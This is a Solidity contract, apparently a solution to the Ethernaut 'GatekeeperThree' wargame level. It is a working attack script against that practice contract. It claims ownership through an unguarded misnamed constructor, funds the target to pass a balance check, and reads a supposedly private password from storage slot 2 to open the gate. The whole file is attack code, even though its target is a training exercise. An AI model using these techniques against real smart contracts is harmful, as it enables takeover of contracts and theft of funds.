// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function enter() external returns (bool);
    function createTrick() external;
    function getAllowance(uint) external;
    function construct0r() external;
}

contract GateThreeHack {
    IGatekeeperThree target;

    //deploy with 1100000000000000 WEI
    constructor(IGatekeeperThree _target) payable {
        target = _target;
        target.construct0r();
        target.createTrick();
        //sending ETH via receive() will pass first check of gateThree
        (bool sent, bytes memory data) = address(target).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    // await contract.trick()
    // 2 is storage slot location of password
    // await web3.eth.getStorageAt('TRICK_ADDRESS', 2)
    // convert bytes32 to number using https://uint256.net/docs/converter/
    function attack(uint256 _password) external {
        target.getAllowance(_password);
        target.enter();
    }
}
